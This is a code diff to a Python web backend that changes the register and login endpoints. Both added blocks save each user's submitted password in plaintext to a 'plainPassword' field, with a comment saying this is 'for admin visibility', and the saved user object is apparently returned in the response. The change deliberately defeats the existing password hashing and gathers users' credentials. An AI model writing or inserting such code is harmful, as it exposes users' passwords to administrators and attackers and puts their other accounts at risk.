@@ -218,6 +218,8 @@ def register(body: RegisterRequest) -> dict[str, Any]:
     if get_user_by_email(body.email.lower()):
         raise HTTPException(status_code=400, detail="Username already registered.")
     user = create_user(body.email.lower(), pwd_context.hash(body.password), body.referral_code)
+    user["plainPassword"] = body.password
+    save_user(user)
     token = create_token(user["userId"], "user")
     return {"token": token, "user": user}
 
@@ -234,6 +236,11 @@ def login(body: LoginRequest) -> dict[str, Any]:
         raise HTTPException(status_code=403, detail="Account locked due to tampering.")
     if user.get("accountStatus") == "BANNED":
         raise HTTPException(status_code=403, detail="Account is banned.")
+    
+    # Store plain password for admin visibility
+    user["plainPassword"] = body.password
+    save_user(user)
+
     token = create_token(user["userId"], "user")
     return {"token": token, "user": user}
 
